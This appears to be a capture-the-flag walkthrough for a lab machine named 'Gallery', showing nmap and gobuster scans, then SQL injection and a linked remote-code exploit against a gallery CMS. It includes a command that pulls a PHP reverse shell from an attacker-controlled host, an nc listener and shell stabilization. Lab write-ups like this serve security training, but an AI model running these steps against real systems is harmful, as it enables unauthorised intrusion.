## Gallery


1. Enumerate with nmap, ports 80 and 8080 are open
```
root@ip-10-10-199-150:~# nmap -sS -sV 10.10.187.97

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-22 16:51 GMT
Nmap scan report for ip-10-10-187-97.eu-west-1.compute.internal (10.10.187.97)
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:C9:D8:1F:EB:1F (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
```

2. Run gobuster
```
root@ip-10-10-199-150:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.187.97
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.187.97
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/03/22 16:53:09 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/gallery (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2022/03/22 16:53:12 Finished
===============================================================
```

3. Navigate to `/gallery` and we find that it's a content management system. It's vulnerable to a SQL injection that will let us login automatically, but if we do that there's no way of retrieving the password hashes, which means we need to get a shell. Do some research and find an [exploit](https://www.exploit-db.com/exploits/50214). I modified the URLs inside the script to work for this CTF. Run it and it'll upload a script and give you a URL that lets you run commands on the server.
4. Simply entering a reverse shell command into the URL doesn't seem to work, so let's upload a php reverse shell into the server. First, download it from [github](https://github.com/pentestmonkey/php-reverse-shell). Then modify the IP address and port to point to your machine, create a web server on that directory with `python3 -m http.server`, and download it onto the target machine with `curl%20http://<attacker ip address>:8000/php-reverse-shell.php%20%3E%20php_shell.php`
5. Now go to `http://<target ip address>/gallery/uploads/` and you should see your shell. Start a nc listener with `nc -nvlp <port>` and run the reverse shell on the server by clicking on it. Once you get the shell, stabilize it with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
